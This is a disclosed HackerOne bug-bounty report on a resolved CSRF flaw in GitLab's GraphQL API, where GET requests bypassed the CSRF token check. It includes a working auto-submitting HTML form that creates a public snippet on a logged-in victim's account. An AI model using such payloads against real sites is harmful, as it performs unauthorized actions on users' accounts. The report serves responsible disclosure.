---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1122408'
original_report_id: '1122408'
title: CSRF on /api/graphql allows executing mutations through GET requests
weakness: Cross-Site Request Forgery (CSRF)
team_handle: gitlab
created_at: '2021-03-10T16:49:12.681Z'
disclosed_at: '2021-08-02T19:10:34.660Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 72
asset_identifier: gitlab.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF on /api/graphql allows executing mutations through GET requests

## Metadata

- HackerOne Report ID: 1122408
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: gitlab
- Disclosed At: 2021-08-02T19:10:34.660Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Mutations are `edit` or `create`  queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection


### Code for Testing

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>


    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```
This exploit would create a snippet named `Tesssst Snippet` on the user's account. 


### Steps to Reproduce

1. Host this file
2. Login to gitlab
3. Open the link to that html
4. Check the snippets for the logged in user. 


### Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.


### POC

Attached the request and response screenshot



### What is the expected *correct* behavior?

The backend must check the existence of csrf tokens for GET requests as well.

## Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
